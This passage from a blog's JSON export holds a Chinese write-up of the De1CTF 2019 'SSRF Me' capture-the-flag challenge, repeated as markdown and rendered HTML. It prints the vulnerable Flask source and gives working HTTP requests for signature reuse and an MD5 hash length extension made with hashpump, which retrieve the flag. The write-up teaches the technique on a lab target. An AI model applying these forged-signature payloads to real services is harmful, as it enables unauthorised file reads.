1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","source":"_posts/buuoj刷题记录4.md","raw":"---\ntitle: buuoj刷题记录4\ndate: 2019-12-28 21:16:16\ntags:\n - web \n - ctf  \n - buuctf\n - De1CTF\n---\n## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 \n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976\n\n```\n\n结果`{\"code\": 200, \"data\": \"flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n\"}`\n\n","slug":"buuoj刷题记录4","published":1,"updated":"2019-12-30T08:18:18.126Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4s68np80000t47e7n0scb9i","content":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   #写上原有数据</span><br><span class=\"line\">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class=\"line\">Input Data to Add: read   #拓展的数据</span><br><span class=\"line\">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span 